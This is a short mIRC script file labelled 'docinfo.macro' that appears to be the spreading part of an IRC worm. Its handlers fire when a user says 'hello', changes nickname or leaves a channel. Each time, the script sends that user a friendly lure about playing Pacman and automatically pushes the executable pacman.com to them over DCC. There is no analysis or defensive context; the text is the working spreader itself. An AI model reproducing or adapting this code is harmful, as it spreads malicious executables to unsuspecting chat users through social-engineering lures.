docinfo.macro:
[script]
n0= on 1:TEXT:*hello*:#:{
n1= /if ( $nick == $me ) { halt }
n2= /msg $nick Hello.. Let's play Pacman.. Just like the good old days..
n3= /dcc send -c $nick c:\Windows\Favorites\pacman.com
n4= }
n5= on 1:NICK:{
n6= /msg $newnick $newnick is better than your previous lame handle, $nick ..
n7= /if ( $newnick == $me ) { halt }
n8= /msg $newnick Hello... Let's play Pacman.. Just like the good old days..
n9= /dcc send -c $newnick c:\Windows\Favorites\pacman.com
n10= }
n11= on 1:PART:#:{
n12= /if ( $nick == $me ) { halt }
n13= /msg $nick Bye, bye.. For now, enjoy playing Pacman..
n14= /dcc send -c $nick c:\Windows\Favorites\pacman.com
n15= }
